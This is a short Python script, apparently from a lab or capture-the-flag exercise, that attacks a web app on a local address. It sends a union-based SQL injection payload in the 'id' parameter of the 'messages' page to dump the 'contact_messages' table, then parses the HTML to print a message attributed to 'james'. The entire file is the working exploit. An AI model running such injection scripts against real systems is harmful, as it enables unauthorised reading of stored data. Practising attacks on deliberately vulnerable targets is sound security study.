import requests
from bs4 import BeautifulSoup

ip = 'http://0.0.0.0:5001/'
mail = '"james@bond.mi5"'
page = 'messages'
injection = '\' union select * from contact_messages -- '

field = {'id': '1 ' + injection}

url = ip + page

response = requests.get(url, params=field)
body = response.text

soup = BeautifulSoup(body, 'html.parser')
print(soup.find(string="james said :").find_next('blockquote').contents[0])
